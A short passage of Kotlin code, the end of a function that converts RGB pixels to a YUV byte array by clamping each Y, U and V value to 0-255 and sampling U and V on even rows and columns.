                yuv[yIndex++] = (if (y < 0) 0 else if (y > 255) 255 else y).toByte()

                if (evenRow && (i and 1) == 0) {
                    u = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                    v = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
                    yuv[uvIndex++] = (if (u < 0) 0 else if (u > 255) 255 else u).toByte()
                    yuv[uvIndex++] = (if (v < 0) 0 else if (v > 255) 255 else v).toByte()
                }
            }
        }
        return yuv
    }
}
